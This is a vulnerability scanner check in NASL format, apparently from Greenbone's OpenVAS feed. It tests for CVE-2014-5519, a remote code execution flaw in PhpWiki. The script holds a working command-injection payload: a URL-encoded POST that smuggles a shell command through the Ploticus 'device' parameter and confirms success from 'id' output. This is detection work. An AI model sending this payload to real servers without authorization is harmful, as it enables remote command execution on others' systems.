# SPDX-FileCopyrightText: 2014 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.105074");
  script_version("2024-06-28T15:38:46+0000");
  script_cve_id("CVE-2014-5519");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("PhpWiki RCE Vulnerability");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/34451/");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/69444");
  script_tag(name:"last_modification", value:"2024-06-28 15:38:46 +0000 (Fri, 28 Jun 2024)");
  script_tag(name:"creation_date", value:"2014-08-29 11:48:21 +0200 (Fri, 29 Aug 2014)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2014 Greenbone AG");
  script_dependencies("find_service.nasl", "no404.nasl", "webmirror.nasl", "DDI_Directory_Scanner.nasl", "gb_php_http_detect.nasl", "global_settings.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute arbitrary
commands in the context of the affected application.");

  script_tag(name:"vuldetect", value:"Send a special crafted HTTP POST request and check the response.");

  script_tag(name:"solution", value:"Ask the Vendor for an update.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_tag(name:"summary", value:"PhpWiki is prone to a remote code execution (RCE)
  vulnerability.");

  script_tag(name:"affected", value:"PhpWiki 1.5.0. Other versions may affected as well.");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("list_array_func.inc");

port = http_get_port( default:80 );
if( ! http_can_host_php( port:port ) ) exit( 0 );

foreach dir( make_list_unique( "/phpwiki", "/wiki", http_cgi_dirs( port:port) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/";
  buf = http_get_cache( item:url, port:port );

  if( "Powered by PhpWiki" >< buf ) {
    useragent = http_get_user_agent();
    host = http_host_name( port:port );
    ex = 'pagename=HeIp&edit%5Bcontent%5D=%3C%3CPloticus+device%3D%22%3Becho+123%27%3A%3A%3A%27+1%3E%262%3B' +
         'id' +
         '+1%3E%262%3Becho+%27%3A%3A%3A%27123+1%3E%262%3B%22+-prefab%3D+-csmap%3D+data%3D+alt%3D+help%3D+%3E%3E' +
         '&edit%5Bpreview%5D=Preview&action=edit';

    len = strlen( ex );

    req = 'POST ' + dir + '/index.php HTTP/1.1\r\n' +
          'Host: ' + host + '\r\n' +
          'Accept-Encoding: identity\r\n' +
          'Content-Length: ' + len + '\r\n' +
          'Content-Type: application/x-www-form-urlencoded\r\n' +
          'Connection: close\r\n' +
          'User-Agent: ' + useragent + '\r\n' +
          '\r\n' +
          ex;
    result = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

    if( result =~ "uid=[0-9]+.*gid=[0-9]+" ) {
      match = egrep( pattern:"uid=[0-9]+.*gid=[0-9]+", string:result );
      send_recv = 'Request:\n' + req + '\n\nResponse:\n[...]' + match + '[...]\n';
      security_message( port:port, expert_info:send_recv );
      exit( 0 );
    }
  }
}

exit( 0 );
